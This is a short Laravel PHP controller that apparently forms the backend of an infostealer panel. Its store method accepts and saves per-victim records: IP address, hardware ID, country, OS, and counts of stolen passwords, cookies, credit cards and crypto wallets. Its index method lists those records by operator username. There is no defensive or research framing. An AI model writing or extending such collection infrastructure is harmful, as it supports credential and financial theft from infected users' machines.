<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Log;

class LogController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index(Request $request, $username)
    {
        $logs = Log::where('username', $username)->get();

    return response()->json([
        'success' => true,
        'logs' => $logs,
    ]);
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $validated = $request->validate([
            'username' => 'required',
            'ip' => 'required',
            'user' => 'required|string',
            'hwid' => 'required',
            'country' => 'required',
            'os' => 'required',
            'date' => 'required',
            'password_count' => 'required',
            'cookie_count' => 'required',
            'cc_count' => 'required',
            'wallet_count' => 'required',
        ]);

        
    
        $log = Log::create($validated);
    
        return response()->json([
            'success' => true,
            'log' => $log,
        ]);
    }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }
}
